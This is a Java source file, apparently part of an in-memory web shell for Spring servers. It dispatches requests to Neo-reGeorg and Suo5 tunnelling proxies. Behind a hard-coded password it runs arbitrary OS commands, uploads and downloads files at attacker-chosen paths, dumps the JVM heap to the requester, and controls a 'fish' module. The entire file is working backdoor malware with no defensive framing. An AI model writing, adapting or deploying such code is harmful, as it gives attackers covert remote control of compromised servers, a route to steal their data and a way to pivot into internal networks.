package com.stdout.Utils;

import com.stdout.Config.DefaultConfig;
import com.stdout.Models.FileManager;
import com.stdout.Models.HeapDumper;
import com.stdout.Models.SpringProxy;
import com.stdout.Models.Suo5;
import com.stdout.Utils.Redefine.MyRequest;

public class PreDoFilter {
    public static String PreDeal(Object request, Object response) throws Exception {
        String result = "";
        String uri = MyRequest.getRequestURI(request);
        String ans = PreDelURI(uri);
        if ((ans != null) && (ans.length() != 0)) {
            switch (ans) {
                case "Neo":
                    SpringProxy.doProxy(request, response);
                    break;
                case "Suo5":
                    Suo5 o = new Suo5();
                    o.process(request, response);
                    break;
            }
            return null;
        }

        result += com.stdout.Models.Fish.StaticFish(uri);

        if (result.length() != 0) {
            return result;
        }

        String password = MyRequest.getParameter(request, "password");

        if (password != null) {
            if (password.equals(DefaultConfig.SpringMemShellConfig.MemShellPassword)) {
                String model = MyRequest.getParameter(request, "model");
                if (model == null || model.length() == 0) {
                    return null;
                }

                switch (model) {
                    case "help":
                        result += com.stdout.Models.Helper.help();
                        break;
                    case "exec":
                        String cmd = MyRequest.getParameter(request, "cmd");
                        result += com.stdout.Models.CommandExecutor.exec(cmd);
                        break;
                    case "fish": {
                        String action = MyRequest.getParameter(request, "action");
                        if (action.equals("start")) {
                            String target = MyRequest.getParameter(request, "target");
                            String file = MyRequest.getParameter(request, "file");
                            result += com.stdout.Models.Fish.fishStart(target, file);
                        } else if (action.equals("stop")) {
                            result += com.stdout.Models.Fish.fishStop();
                        } else if (action.equals("show")) {
                            result += com.stdout.Models.Fish.fishShow();
                        }
                        break;
                    }
                    case "file": {
                        String action = MyRequest.getParameter(request, "action");
                        if (action == null) {
                            result += FileManager.uploadView();
                        } else if (action.equals("download")) {
                            try {
                                String path = MyRequest.getParameter(request, "path");
                                FileManager.download(response, path);
                                return null;
                            } catch (Exception e) {
                                result += "need param: path";
                            }
                        } else if (action.equals("upload")) {
                            result += FileManager.upload(request);
                        }
                        break;
                    }
                    case "heapdump":
                        String path = new HeapDumper().dumpHeap();
                        FileManager.download(response, path);
                        return null;
                    case "exit":
                        result += com.stdout.springMem.SpringMemModels.exit();
                        break;
                }

                return result;
            }
        }
        return "";
    }

    public static String PreDelURI(String uri) {
        switch (uri) {
            case DefaultConfig.ProxyConfig.NeoProxy:
                return "Neo";
            case DefaultConfig.ProxyConfig.Suo5Proxy:
                return "Suo5";
        }
        return null;
    }
}
